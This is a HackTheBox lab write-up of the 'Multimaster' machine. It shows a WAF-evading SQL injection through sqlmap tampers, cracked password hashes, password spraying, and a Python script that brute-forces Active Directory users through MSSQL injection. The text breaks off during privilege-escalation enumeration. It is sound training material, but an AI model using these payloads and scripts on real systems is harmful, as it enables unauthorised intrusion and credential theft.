# Multimaster

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 22:20 +08
Nmap scan report for 10.129.95.200
Host is up (0.011s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49687/tcp open  unknown
49694/tcp open  unknown
```

RDP is available for this machine, which is not the usual for HackTheBox machines. I did a detailed `nmap` scan just in case:

```
$ sudo nmap -p 53,80,88,135,139,445,464,593,636,3268,3269,3389,5985,9389 -sC -sV -O -min-rate 3000 10.129.95.200
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 22:21 +08
Nmap scan report for 10.129.95.200
Host is up (0.013s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-25 14:28:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2023-06-25T14:28:47+00:00
|_ssl-date: 2023-06-25T14:29:27+00:00; +6m55s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2023-06-24T14:09:53
|_Not valid after:  2023-12-24T14:09:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-25T14:28:49
|_  start_date: 2023-06-25T14:10:02
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-06-25T07:28:51-07:00
|_clock-skew: mean: 1h30m55s, deviation: 3h07m51s, median: 6m54s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

We can add `megacorp.local` and the `multimaster.megacorp.local` domains to our `/etc/hosts` file for this machine.&#x20;

### SMB Enumeration

SMB does not allow us to access anything without credentials for this machine.&#x20;

### Employee Hub --> SQL Injection

Port 80 shows us a dashboard of some sorts:

<figure><img src="../../../.gitbook/assets/image (2664).png" alt=""><figcaption></figcaption></figure>

There were some functions, and the one that stood out was the 'Colleague Finder', which took one name parameter.

<figure><img src="../../../.gitbook/assets/image (2048).png" alt=""><figcaption></figcaption></figure>

If nothing is entered, then all the employees are returned.

<figure><img src="../../../.gitbook/assets/image (3520).png" alt=""><figcaption></figcaption></figure>

We can take note of these usernames for later. More importantly, we should see how this thing processes queries. When viewed in Burpsuite, the request simply sent a POST request to `/api/getColleagues` and it returns a response.

<figure><img src="../../../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.&#x20;

UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.

<figure><img src="../../../.gitbook/assets/image (3809).png" alt=""><figcaption></figcaption></figure>

This likely indicates that our query has caused a backend error. Using this, we can try some of the `sqlmap` tampers that are available:

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}

Tampers are basically scripts that change the characters being sent in to the website. There's a `charunicodeescape` option that we can try. The final command looks something like this:

```
$ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3
```

The initial attempt tells me there's nothing, and that all requests ended in 403. I tried again with a `--delay 3` flag in case there was a WAF blocking my access, and it works. The final command I used was:

```
$ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3 --batch --dbms=mssql --delay 3
```

> The guess of the DBMS being MS-SQL was purely a guess based on usual HTB machine patterns, but obviously this is not always the case! Windows AD can use SQLite3 or MySQL for their backends, especially for web servers!&#x20;

{% code overflow="wrap" %}
```
[22:58:39] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
[22:59:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:59:17] [INFO] target URL appears to have 5 columns in query
[23:00:51] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                                         
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"' AND 4943=4943-- fsuJ"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: {"name":"' WAITFOR DELAY '0:0:5'-- tWyh"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-5737' UNION ALL SELECT 68,68,68,CHAR(113)+CHAR(107)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(99)+CHAR(103)+CHAR(105)+CHAR(67)+CHAR(121)+CHAR(77)+CHAR(74)+CHAR(122)+CHAR(117)+CHAR(85)+CHAR(75)+CHAR(99)+CHAR(110)+CHAR(99)+CHAR(76)+CHAR(72)+CHAR(99)+CHAR(70)+CHAR(69)+CHAR(77)+CHAR(120)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(68)+CHAR(103)+CHAR(66)+CHAR(101)+CHAR(104)+CHAR(118)+CHAR(89)+CHAR(79)+CHAR(117)+CHAR(78)+CHAR(113)+CHAR(76)+CHAR(101)+CHAR(67)+CHAR(71)+CHAR(100)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113),68-- wUMy"}
```
{% endcode %}

Great! Now that we have this, we can attempt to enumerate the database. Here are the results from repeated use of `sqlmap`:

```
Tables:
[23:01:49] [INFO] fetching tables for databases: Hub_DB, master, model, msdb, tempdb


Dumping of Hub_DB:
Database: Hub_DB
Table: Colleagues
[17 entries]
+----+----------------------+----------------------+-------------+----------------------+
| id | name                 | email                | image       | position             |
+----+----------------------+----------------------+-------------+----------------------+
| 1  | Sarina Bauer         | sbauer@megacorp.htb  | sbauer.jpg  | Junior Developer     |
| 2  | Octavia Kent         | okent@megacorp.htb   | okent.jpg   | Senior Consultant    |
| 3  | Christian Kane       | ckane@megacorp.htb   | ckane.jpg   | Assistant Manager    |
| 4  | Kimberly Page        | kpage@megacorp.htb   | kpage.jpg   | Financial Analyst    |
| 5  | Shayna Stafford      | shayna@megacorp.htb  | shayna.jpg  | HR Manager           |
| 6  | James Houston        | james@megacorp.htb   | james.jpg   | QA Lead              |
| 7  | Connor York          | cyork@megacorp.htb   | cyork.jpg   | Web Developer        |
| 8  | Reya Martin          | rmartin@megacorp.htb | rmartin.jpg | Tech Support         |
| 9  | Zac Curtis           | zac@magacorp.htb     | zac.jpg     | Junior Analyst       |
| 10 | Jorden Mclean        | jorden@megacorp.htb  | jorden.jpg  | Full-Stack Developer |
| 11 | Alyx Walters         | alyx@megacorp.htb    | alyx.jpg    | Automation Engineer  |
| 12 | Ian Lee              | ilee@megacorp.htb    | ilee.jpg    | Internal Auditor     |
| 13 | Nikola Bourne        | nbourne@megacorp.htb | nbourne.jpg | Head of Accounts     |
| 14 | Zachery Powers       | zpowers@megacorp.htb | zpowers.jpg | Credit Analyst       |
| 15 | Alessandro Dominguez | aldom@megacorp.htb   | aldom.jpg   | Senior Web Developer |
| 16 | MinatoTW             | minato@megacorp.htb  | minato.jpg  | CEO                  |
| 17 | egre55               | egre55@megacorp.htb  | egre55.jpg  | CEO                  |
+----+----------------------+----------------------+-------------+----------------------+

Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+
```

Loads of hashes. Only 3 of them were crackable using `hashcat -m 17900`.

```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
```

The rest of them weren't crackable. We can gather the rest of the users:

```
sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minatotw
egre55
```

Then, we can attempt to use password spraying to find a valid user.&#x20;

### Spray Fail --> SID Brute --> Shell

For some reason, none of these users were valid.&#x20;

<pre><code>$ crackmapexec smb megacorp.local -u users -p passwords
<strong>SMB         megacorp.local  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
</strong>SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\james:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\james:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\james:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zac:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\zpowers:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\minatotw:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\minatotw:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\minatotw:password1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:finance1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:password1 STATUS_LOGON_FAILURE
</code></pre>

I found this rather odd. I did a `kerbrute` to find more users, and found that there were different users found by `kerbrute` relative to those in the database.&#x20;

None of the users that I found via `kerbrute` worked with any of the passwords as well. So we were just left with an SQL Injection on an MSSQL database. Googling for AD enumeration via MSSQL injection led me to this page:

{% embed url="https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html" %}

Basically, it is possible for us to find valid usernames using the MSSQL Injection that we have found. Earlier, `sqlmap` indicated that there were 5 columns present, and that it used UNION injection. Following the above PoC, we can use this payload:

```sql
a' union select 1,1,1,1,(select default_domain())--
```

I used this site to encode it into a suitable UTF-8 format:

{% embed url="https://checkserp.com/encode/utf8/" %}

Testing it worked!

<figure><img src="../../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

We can then try to enumerate the Administrator user using this payload:

{% code overflow="wrap" %}
```sql
a' union select 1,1,1,1,(select sys.fn_varbintohexstr(SUSER_SID('megacorp\Administrator')))--
```
{% endcode %}

This would result in some hex being returned:

<figure><img src="../../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

We can use this to send another query that would return usernames and convert the SID for us.&#x20;

{% code overflow="wrap" %}
```sql
a' union select 1,1,1,1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)--
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>

Now, we just need a way to automate this method. I took the two functions used to convert the hex to a valid SID from the user earlier.

```
$ python3 sql_enum.py
S-1-5-21-3167813660-1240564177-918740779-
```

Then, we can fit this SID into a payload with a test number of 1000.

{% code overflow="wrap" %}
```sql
a' union select 1,1,1,1,(SUSER_SNAME(SID_BINARY('S-1-5-21-3167813660-1240564177-918740779-1000')))--
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

This is the final script I used to automate this method:

```python
import requests
import json
import sys
import struct
import time

def prepare_sid(sid):
    hex_string = bytes.fromhex(sid[2:])
    mod_sid = sid_to_str(hex_string)
    domain_sid_data = mod_sid.split('-')[:7]
    domain_sid = '-'.join(domain_sid_data) + "-"

    print(domain_sid+"\n")
    return domain_sid

#Build out the SID string
def sid_to_str(sid):
    if sys.version_info.major < 3:
        revision = ord(sid[0])
    else:
        revision = sid[0]

    if sys.version_info.major < 3:
        number_of_sub_ids = ord(sid[1])
    else:
        number_of_sub_ids = sid[1]
    iav = struct.unpack('>Q', b'\x00\x00' + sid[2:8])[0]
    sub_ids = [struct.unpack('<I', sid[8 + 4 * i:12 + 4 * i])[0]
               for i in range(number_of_sub_ids)]

    return 'S-{0}-{1}-{2}'.format(revision, iav, '-'.join([str(sub_id) for sub_id in sub_ids]))

def utfme(str):
    val = []
    for i in str:
        val.append("\\u00"+hex(ord(i)).split("x")[1])
    
    return ''.join([i for i in val])

sid = prepare_sid('0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000')

url = 'http://megacorp.local/api/getColleagues'
for i in range (500,10000):
	payload = f"a' union select 1,1,1,1,(SUSER_SNAME(SID_BINARY('S-1-5-21-3167813660-1240564177-918740779-{i}')))--"
	encoded_payload = utfme(payload)
	r = requests.post(url, data= '{"name":"' + utfme(payload) + '"}',headers={'Content-Type': 'Application/json'})
	data = json.loads(r.text)
	src_value = data[0]['src']
	try:
		username = src_value.split('\\')[1]
		print(username)
	except:
		print('nope!')
	time.sleep(3)
```

This would slowly brute force all the users out. I included the 'nope!' part to let me know that the script was still running fine. This script takes quite long...but eventually we would get some valid users. Here's what the output of my script looks like:

```
$  python3 sql_enum.py
S-1-5-21-3167813660-1240564177-918740779-

Administrator
Guest
krbtgt
DefaultAccount
nope!
nope!
nope!
nope!
nope!
nope!
nope!
nope!
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
...
```

There are a lot of groups starting at 500, so I changed it up and started at 1000 instead, which is where user IDs should start. Because this was taking so long, everytime I found a valid user I would test the credentials immediately. Eventually, it found these users:

```
...
DnsUpdateProxy
svc-nas
nope!
Privileged IT Accounts
nope!
nope!
nope!
nope!
tushikikatomo
andrew
lana
...
```

The `tushikikatomo` user had valid credentials!&#x20;

```
$ crackmapexec smb megacorp.local -u tushikikatomo -p passwords
SMB         megacorp.local  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1
```

I was then able to `evil-winrm` in as this user:

<figure><img src="../../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Basic Enumeration + Bloodhound

The current user had no privileges or anything of interest. Since we had a shell, we can do some basic enumeration like finding the other users present:

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/7/2020   7:24 PM                .NET v4.5
d-----         1/7/2020   7:24 PM                .NET v4.5 Classic
d-----         1/9/2020   3:18 AM                Administrator
d-----         3/9/2020   3:20 AM                alcibiades
d-----         3/9/2020   2:53 AM                cyork
d-----         1/9/2020   5:14 PM                jorden
d-----         3/7/2020   8:38 AM                MSSQLSERVER
d-r---       11/20/2016   5:24 PM                Public
d-----         1/9/2020   5:12 PM                sbauer
d-----         3/7/2020   8:38 AM                SQLTELEMETRY
```

In the `C:\` directory, there were some interesting folders:

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  12:41 PM                DFSRoots
d-----         1/7/2020   7:23 PM                inetpub
d-----        9/25/2019   5:01 AM                PerfLogs
d-r---        7/19/2021   1:07 AM                Program Files
d-----         1/9/2020   1:18 PM                Program Files (x86)
d-r---         1/9/2020   5:14 PM                Users
d-----        7/19/2021   1:29 AM                Windows
```

The DFSRoots gives me a weird error regarding network location:

```
*Evil-WinRM* PS C:\DFSRoots\dfs\Development> dir
The network location cannot be reached. For information about network troubleshooting, see Windows Help.

At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : ReadError: (C:\DFSRoots\dfs\Development:String) [Get-ChildItem], IOException
    + FullyQualifiedErrorId : DirIOError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

We probably don't have the permissions for this yet. We also cannot access the `inetpub` directory:

```
*Evil-WinRM* PS C:\inetpub\wwwroot> dir
Access to the path 'C:\inetpub\wwwroot' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\inetpub\wwwroot:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Within the `C:\Program Files` directory, we can see that Microsoft Visual Studio is installed.

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:59 AM                Common Files
d-----         1/9/2020   2:39 PM                Internet Explorer
d-----         1/7/2020   9:40 PM                Microsoft
da----         1/7/2020   7:47 PM                Microsoft SQL Server
d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0
da----         1/9/2020   3:18 AM                Microsoft VS Code
d-----         1/7/2020   7:27 PM                Microsoft.NET
d-----         1/7/2020   9:43 PM                Reference Assemblies
d-----        7/19/2021   1:07 AM                VMware
d-r---         1/9/2020   2:46 PM                Windows Defender
d-----         1/9/2020   2:39 PM                Windows Mail
d-----         1/9/2020   2:39 PM                Windows Media Player
d-----        7/16/2016   6:23 AM                Windows Multimedia Platform
d-----        7/16/2016   6:23 AM                Windows NT
d-----         1/9/2020   2:39 PM                Windows Photo Viewer
d-----        7/16/2016   6:23 AM                Windows Portable Devices
d-----        7/16/2016   6:23 AM                WindowsPowerShell
```

The Windows SQL Server is also not default. Before we delve further into a specific software, I wanted to run `bloodhound-python` to get more information about the domain.

```
$ bloodhound-python -d megacorp.local -u tushikikatomo -p 'finance1' -c all -ns 10.129.95.200
INFO: Found AD domain: megacorp.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 28 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
INFO: Done in 00M 02S
```

Start Bloodhound and upload the information as usual. Then, we can check each user from the `C:\Users` directory to identify if there are ACLs to abuse.

First, we find that `cyork` is part of the Developers group:

<figure><img src="../../../.gitbook/assets/image (2250).png" alt=""><figcaption></figcaption></figure>

There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.&#x20;

We can also find that the `sbauer` user has some privileges over `jorden`.

<figure><img src="../../../.gitbook/assets/image (2753).png" alt=""><figcaption></figcaption></figure>

The rest of the users don't have anything interesting about them. I also used `PrivescCheck.ps1` to enumerate for me since WinPEAS was not working for some reason. Here was the interesting output:

<pre><code>+------+------------------------------------------------+------+
| TEST | APPS > Non-default Apps                        | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate non-default and third-party applications by |
